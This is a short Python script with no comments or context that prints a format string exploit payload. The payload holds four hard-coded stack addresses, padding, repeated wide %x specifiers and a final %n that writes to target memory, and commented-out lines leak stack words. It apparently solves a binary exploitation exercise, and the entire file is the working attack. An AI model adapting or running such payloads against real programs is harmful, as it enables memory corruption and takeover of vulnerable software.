import sys


#sys.stdout.write('\x06\x87\x04\x08_%08x.%08x.%08x.%08x.%08x')
#sys.stdout.write('\x16\x87\x04\x08_%08x.%08x.%08x.%08x.%08x')


sys.stdout.write('\xdc\xd5\xff\xff')
sys.stdout.write('\xed\xd5\xff\xff')
sys.stdout.write('\xee\xd5\xff\xff')
sys.stdout.write('\xef\xd5\xff\xff')
sys.stdout.write('AA')


for i in range(0,5):
    sys.stdout.write('%26902883x.')

#sys.stdout.write('_%s')
sys.stdout.write('%n')


